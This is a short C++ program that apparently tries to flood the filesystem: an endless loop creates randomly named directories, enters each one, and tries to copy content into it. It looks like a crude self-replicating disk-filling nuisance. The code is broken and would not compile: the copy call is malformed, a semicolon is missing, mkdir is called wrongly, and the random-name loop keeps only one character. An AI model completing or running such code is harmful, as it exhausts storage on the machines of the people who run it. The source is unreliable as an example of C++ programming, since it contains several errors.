#include <iostream>
#include <string>
#include <cstdlib>
#include <ctime>
#include <thread>
#include <chrono>
#include <sys/stat.h>
#include <sys/param.h>
#include <unistd.h>
#include <filesystem>

using namespace std;

static const char alphanum[] = "0123456789" "ABCDEFGHIJKLMNOPQRSTUVWXYZ" "abcdefghijklmnopqrstuvwxyz";
int len = sizeof(alphanum) - 1;
char genRandom() {
    return alphanum[rand() % len];
}

int main() {
    
    string name;
    string cwd = filesystem::current_path();
    
    int count = 0;
    
    //while (count < 200)
    while (true) {
        srand(time(0));
        for(int z = 0; z < 20; z++) {
            name = genRandom();
        }
        this_thread::sleep_for(chrono::seconds(1));
        mkdir(name);
        chdir(name);
        filesystem.copy(, filesystem::current_path();
        chdir(cwd);
        ++count
    }
}
